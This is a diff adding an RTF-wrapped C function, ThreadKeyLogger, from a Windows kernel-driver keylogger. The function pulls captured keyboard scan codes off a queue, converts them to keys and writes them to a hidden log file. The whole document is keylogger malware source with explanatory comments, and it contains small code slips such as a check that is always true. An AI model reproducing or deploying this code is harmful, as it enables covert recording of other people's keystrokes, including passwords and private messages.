@@ -1,0 +1,95 @@
+{\rtf1\ansi\ansicpg1252\cocoartf1561\cocoasubrtf600
+{\fonttbl\f0\fswiss\fcharset0 Helvetica;}
+{\colortbl;\red255\green255\blue255;\red111\green0\blue138;\red43\green145\blue175;\red128\green128\blue128;
+\red0\green128\blue0;\red0\green0\blue255;\red47\green79\blue79;\red163\green21\blue21;}
+{\*\expandedcolortbl;;\csgenericrgb\c43529\c0\c54118;\csgenericrgb\c16863\c56863\c68627;\csgenericrgb\c50196\c50196\c50196;
+\csgenericrgb\c0\c50196\c0;\csgenericrgb\c0\c0\c100000;\csgenericrgb\c18431\c30980\c30980;\csgenericrgb\c63922\c8235\c8235;}
+\paperw11900\paperh16840\margl1440\margr1440\vieww10800\viewh8400\viewkind0
+\deftab708
+\pard\pardeftab708\ri-340\partightenfactor0
+
+\f0\fs22 \cf2 VOID\cf0  ThreadKeyLogger(\cf2 IN\cf0  \cf3 PVOID\cf0  \cf4 pContext\cf0 )\
+\{\
+\
+	\cf3 PDEVICE_EXTENSION\cf0  pKeyboardDeviceExtension = (\cf3 PDEVICE_EXTENSION\cf0 )\cf4 pContext\cf0 ;\
+	\cf3 PDEVICE_OBJECT\cf0  pKeyboardDeviceOjbect = pKeyboardDeviceExtension->pKeyboardDevice;\
+\
+	\cf3 PLIST_ENTRY\cf0  pListEntry;\
+\pard\pardeftab708\fi720\ri-340\partightenfactor0
+\cf5 //custom data structure used to hold scancodes in the linked list\cf0 \
+\pard\pardeftab708\ri-340\partightenfactor0
+\cf0 	\cf3 KEY_DATA\cf0 * kData; \
+	\cf5 //Enter the main processing loop... \
+\pard\pardeftab708\fi720\ri-340\partightenfactor0
+\cf5 //This is where we will process the scancodes sent\cf0 \
+\pard\pardeftab708\ri-340\partightenfactor0
+\cf0 	\cf5 //to us by the completion routine.\cf0 \
+	\cf6 while\cf0  (\cf6 true\cf0 )\
+	\{\
+		\cf5 // Wait for data to become available in the queue \cf0 \
+		KeWaitForSingleObject(&pKeyboardDeviceExtension->semQueue, \
+\pard\pardeftab708\li1440\fi720\ri-340\partightenfactor0
+\cf7 Executive\cf0 , \cf7 KernelMode\cf0 , \cf2 FALSE\cf0 , \cf2 NULL\cf0 );\
+\pard\pardeftab708\ri-340\partightenfactor0
+\cf0 \
+		pListEntry = \cf2 ExInterlockedRemoveHeadList\cf0 (\
+\pard\pardeftab708\li1440\fi720\ri-340\partightenfactor0
+\cf0 &pKeyboardDeviceExtension->QueueListHead,\
+&pKeyboardDeviceExtension->lockQueue);\
+\pard\pardeftab708\ri-340\partightenfactor0
+\cf0 \
+		\cf5 //////////////////////////////////////////////////////////////////////\cf0 \
+		\cf5 // NOTE: Kernel system threads must terminate themselves. They cannot\cf0 \
+		\cf5 // be terminated from outside the thread. If the driver is being \cf0 \
+		\cf5 // unloaded, therefore the thread must terminate itself. To do this\cf0 \
+		\cf5 // we use a global variable stored in the Device Extension. \cf0 \
+		\cf5 // When the unload routine wishes to terminate, it will set this \cf0 \
+		\cf5 // flag equal to true and then block on the thread object. When\cf0 \
+		\cf5 // the thread checks this variable and terminates itself, the\cf0 \
+		\cf5 // Unload routine will be unblocked and able to continue its \cf0 \
+		\cf5 // operations.\cf0 \
+		\cf5 //////////////////////////////////////////////////////////////////////\cf0 \
+		\cf6 if\cf0  (pKeyboardDeviceExtension->bThreadTerminate == \cf6 true\cf0 )\
+		\{\
+			PsTerminateSystemThread(\cf2 STATUS_SUCCESS\cf0 );\
+		\}\
+\
+		\cf5 ///////////////////////////////////////////////////////////////////////\cf0 \
+		\cf5 // NOTE: the structure contained in the list cannot be accessed directly. \cf0 \
+		\cf5 // CONTAINING_RECORD returns a pointer to the beginning of the data \cf0 \
+		\cf5 // structure that was inserted into the list.\cf0 \
+		\cf5 ////////////////////////////////////////////////////////////////////////\cf0 \
+		kData = \cf2 CONTAINING_RECORD\cf0 (pListEntry, \cf3 KEY_DATA\cf0 , ListEntry);\
+\
+		\cf5 //Convert the scan code to a key code\cf0 \
+		\cf6 char\cf0  keys[3] = \{ 0 \};\
+		ConvertScanCodeToKeyCode(pKeyboardDeviceExtension, kData, keys);\
+\
+		\cf5 //make sure the key has retuned a valid code before writing it to the file\cf0 \
+		\cf6 if\cf0  (keys != 0)\
+		\{\
+			\cf5 //write the data out to a file \cf0 \
+			\cf6 if\cf0  (pKeyboardDeviceExtension->hLogFile != \cf2 NULL\cf0 ) \
+			\{\
+				\cf3 IO_STATUS_BLOCK\cf0  io_status;\
+				DbgPrint(\cf8 "Writing scan code to file...\\n"\cf0 );\
+\
+				\cf3 NTSTATUS\cf0  status = ZwWriteFile(\
+\pard\pardeftab708\li3600\ri-340\partightenfactor0
+\cf0 pKeyboardDeviceExtension->hLogFile, \cf2 NULL\cf0 , \cf2 NULL\cf0 , \cf2 NULL\cf0 ,\
+\pard\pardeftab708\ri-340\partightenfactor0
+\cf0 					&io_status, &keys, strlen(keys), \cf2 NULL\cf0 , \cf2 NULL\cf0 );\
+\
+				\cf6 if\cf0  (status != \cf2 STATUS_SUCCESS\cf0 )\
+					DbgPrint(\cf8 "Writing scan code to file...\\n"\cf0 );\
+				\cf6 else\cf0 \
+					DbgPrint(\cf8 "Scan code '%s' successfully written to file.\\n"\cf0 , keys);\
+			\}\cf5 //end if\cf0 \
+		\}\cf5 //end if	\cf0 \
+	\}\cf5 //end while\cf0 \
+	\cf6 return\cf0 ;\
+\}\
+\pard\pardeftab708\ri-340\partightenfactor0
+
+\fs18 \cf0 \
+}
